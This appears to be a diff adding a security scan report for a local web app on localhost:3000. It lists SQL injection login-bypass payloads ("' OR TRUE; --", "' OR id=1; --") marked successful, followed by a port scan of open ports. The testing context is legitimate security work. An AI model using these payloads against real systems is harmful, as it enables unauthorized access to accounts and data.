@@ -1,0 +1,16 @@
+Report for localhost:3000
+IP is 127.0.0.1
+Port is 3000
+
+========================================
+SQL injection
+========================================
+Connecting to http://127.0.0.1:3000
+Login page found at http://127.0.0.1:3000/#/login
+SQL injection successful with username "' OR TRUE; --" and password "password to fill place")
+SQL injection successful with username "' OR id=1; --" and password "password to fill place")
+
+========================================
+Port scan
+========================================
+Opened ports: [135, 445, 3000, 5040, 5432, 6327, 6328, 6463, 9010, 9080, 9100, 9180, 17934, 18925, 27017, 27036, 27060, 29819, 33380, 43807, 45654, 49664, 49665, 49666, 49667, 49668, 49672, 49687, 49717, 49718, 49719, 49720, 49808, 49848, 49849, 49858, 49860, 50212, 50215, 50405, 57286, 58991, 59254, 63342]
